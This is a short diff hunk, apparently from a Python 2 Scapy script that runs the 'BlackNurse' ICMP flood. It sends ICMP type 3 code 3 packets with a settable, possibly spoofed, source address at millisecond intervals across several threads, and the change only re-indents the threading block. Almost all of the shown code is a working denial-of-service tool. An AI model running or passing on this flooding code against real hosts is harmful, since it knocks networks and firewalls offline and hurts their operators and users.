@@ -44,12 +44,12 @@ while 1:
 	        ping = send(IP(dst=target,src=source)/ICMP(type=3,code=3)/('blacknurse'),inter=0.001,verbose=0)
                 print "Loop Count per Thread : %s" % a
 		print current_thread()
-# Threading: sends 10 ICMP packets per 1 while loop, totals 100 by the end of 10 while loops
-        for i in range(10):
-            t = Thread(target=blacknurse, args=(i,))
-            t.start()
-	    if True:
-	        t.join()
+            # Threading: sends 10 ICMP packets per 1 while loop, totals 100 by the end of 10 while loops
+            for i in range(10):
+                t = Thread(target=blacknurse, args=(i,))
+                t.start()
+	        if True:
+	            t.join()
     elif userInput == "2":
 	print "Exiting"
 	sys.exit()
